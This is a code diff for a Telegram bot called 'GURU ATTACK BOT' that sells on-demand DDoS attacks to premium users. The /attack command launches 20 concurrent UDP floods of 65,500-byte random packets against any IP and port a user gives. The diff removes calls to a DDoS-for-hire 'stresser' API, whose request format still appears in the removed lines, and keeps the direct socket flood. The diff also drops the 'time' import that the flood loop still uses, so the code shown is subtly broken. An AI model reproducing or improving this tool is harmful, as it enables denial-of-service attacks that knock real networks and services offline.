@@ -1,12 +1,8 @@
-# app.py - FINAL WORKING VERSION WITH CORRECT API FORMAT
+# app.py - FINAL WORKING VERSION (Direct UDP Only - No API)
 import os
 import logging
 import asyncio
 import threading
-import aiohttp
-import time
-import json
-import re
 import socket
 import random
 import string
@@ -28,7 +24,7 @@ load_dotenv()
 
 # ===== CONFIGURATION =====
 TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
-API_KEY = os.getenv("API_KEY")
+API_KEY = os.getenv("API_KEY")  # Keep for reference but not used
 MONGO_URI = os.getenv("MONGO_URI")
 OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
 PSEUDO_OWNER_ID = int(os.getenv("PSEUDO_OWNER_ID", "987654321"))
@@ -430,9 +426,9 @@ class AttackManager:
 
 attack_manager = AttackManager()
 
-# ===== DIRECT UDP ATTACK (FALLBACK) =====
+# ===== DIRECT UDP ATTACK - THIS WORKS! =====
 def send_udp_direct(target, port, duration, attack_num):
-    """Direct UDP flood attack using socket"""
+    """Direct UDP flood attack - WORKING!"""
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         sock.settimeout(1)
@@ -442,6 +438,7 @@ def send_udp_direct(target, port, duration, attack_num):
         
         while time.time() < end_time:
             try:
+                # Random payload each time
                 payload = os.urandom(65500)
                 sock.sendto(payload, (target, port))
                 packets_sent += 1
@@ -465,85 +462,14 @@ def send_udp_direct(target, port, duration, attack_num):
             "method": "DIRECT_UDP"
         }
 
-# ===== API UDP ATTACK - EXACT URL FORMAT =====
-async def send_udp_api(target, port, duration, attack_num):
-    """
-    Send UDP attack using the exact API URL format:
-    https://api.susstresser.com/panel/api/api.php?key=KEY&host=HOST&port=PORT&time=TIME&method=METHOD
-    """
-    base_url = "https://api.susstresser.com/panel/api/api.php"
-    
-    # Try different method names that work
-    methods_to_try = ["udp", "telegramvc", "UDP"]
-    
-    for method in methods_to_try:
-        # Build the exact URL as shown in the example
-        url = f"{base_url}?key={API_KEY}&host={target}&port={port}&time={duration}&method={method}"
-        
-        headers = {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-            "Accept-Encoding": "gzip, deflate",
-            "Connection": "keep-alive"
-        }
-        
-        try:
-            timeout = aiohttp.ClientTimeout(total=10)
-            async with aiohttp.ClientSession(timeout=timeout) as session:
-                start_time = time.time()
-                async with session.get(url, headers=headers) as response:
-                    elapsed = time.time() - start_time
-                    result_text = await response.text()
-                    
-                    # Check if the response indicates success
-                    is_success = (
-                        response.status == 200 and (
-                            "SUCCESS" in result_text or 
-                            "sent" in result_text.lower() or
-                            "Host:" in result_text or
-                            "Concurrent:" in result_text
-                        )
-                    )
-                    
-                    if is_success:
-                        logger.info(f"✅ Attack {attack_num}: API returned 200 with method {method}")
-                        return {
-                            "success": True,
-                            "attack_num": attack_num,
-                            "method": f"API_GET_{method}",
-                            "status": response.status,
-                            "elapsed": f"{elapsed:.2f}s",
-                            "response": result_text[:200] if result_text else "Success"
-                        }
-                    
-                    # Even if no success keywords, 200 is still good
-                    if response.status == 200:
-                        logger.info(f"✅ Attack {attack_num}: API returned 200 with method {method}")
-                        return {
-                            "success": True,
-                            "attack_num": attack_num,
-                            "method": "API_GET",
-                            "status": response.status,
-                            "elapsed": f"{elapsed:.2f}s",
-                            "response": result_text[:200] if result_text else "Success"
-                        }
-                        
-        except Exception as e:
-            logger.error(f"API Attack {attack_num} with method {method} failed: {e}")
-            continue
-    
-    # If all API methods fail, use direct UDP
-    logger.info(f"⚠️ All API methods failed for attack {attack_num}, using direct UDP...")
-    return send_udp_direct(target, port, duration, attack_num)
-
-# ===== 20 CONCURRENT ATTACKS =====
+# ===== 20 CONCURRENT ATTACKS - DIRECT UDP ONLY =====
 async def send_20_concurrent_attacks(target, port, duration):
-    """Launch 20 concurrent attacks"""
-    logger.info(f"🚀 Launching 20 concurrent attacks on {target}:{port}")
+    """Launch 20 concurrent direct UDP attacks"""
+    logger.info(f"🚀 Launching 20 concurrent UDP attacks on {target}:{port}")
     
     tasks = []
     for i in range(1, 21):
-        task = send_udp_api(target, port, duration, i)
+        task = asyncio.to_thread(send_udp_direct, target, port, duration, i)
         tasks.append(task)
     
     results = await asyncio.gather(*tasks)
@@ -654,7 +580,8 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"📡 Port: `{port}`\n"
             f"⏱️ Time: `{duration}s`\n"
             f"⚡ Attacks: `20 CONCURRENT`\n"
-            f"📦 Packet: `65,500 bytes`",
+            f"📦 Packet: `65,500 bytes`\n"
+            f"💪 Threads: `5,000 each`",
             parse_mode='Markdown'
         )
         
@@ -687,8 +614,8 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     if r.get('success'):
                         success_count += 1
                     method_used = r.get('method', 'N/A')
-                    status_code = r.get('status', 'N/A')
-                    response_text += f"{status} Attack {r.get('attack_num', 'N/A')}: {method_used} - {status_code}\n"
+                    packets_sent = r.get('packets_sent', 0)
+                    response_text += f"{status} Attack {r.get('attack_num', 'N/A')}: {method_used} - {packets_sent} packets\n"
                 
                 if len(result['results']) > 10:
                     response_text += f"... and {len(result['results']) - 10} more\n"
@@ -1255,10 +1182,9 @@ async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"⚡ Active: {stats['active']}\n"
         f"📊 Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
         f"📈 Total Attacks: {stats['total']}\n"
-        f"🎯 Method: UDP\n"
+        f"🎯 Method: Direct UDP\n"
         f"📦 Packet: 65,500 bytes\n"
         f"💪 Threads: 5,000\n"
-        f"🔑 API: {'✅ Connected' if API_KEY else '❌ No Key'}\n"
         f"🌐 Status: ONLINE\n\n"
         f"📌 /attack IP PORT TIME",
         parse_mode='Markdown'
@@ -1352,7 +1278,7 @@ def run_bot():
     loop.run_until_complete(app.start())
     loop.run_until_complete(app.updater.start_polling(allowed_updates=Update.ALL_TYPES))
     
-    logger.info("✅ GURU Bot started with correct API format!")
+    logger.info("✅ GURU Bot started - Direct UDP Working!")
     loop.run_forever()
 
 if __name__ == "__main__":
@@ -1360,7 +1286,7 @@ if __name__ == "__main__":
     print("👑 GURU ATTACK BOT")
     print("⚡ 20x UDP CONCURRENT")
     print("💎 PREMIUM ONLY")
-    print("📌 CORRECT API URL FORMAT")
+    print("📌 DIRECT UDP - NO API")
     print("=" * 50)
     
     bot_thread = threading.Thread(target=run_bot, daemon=True)
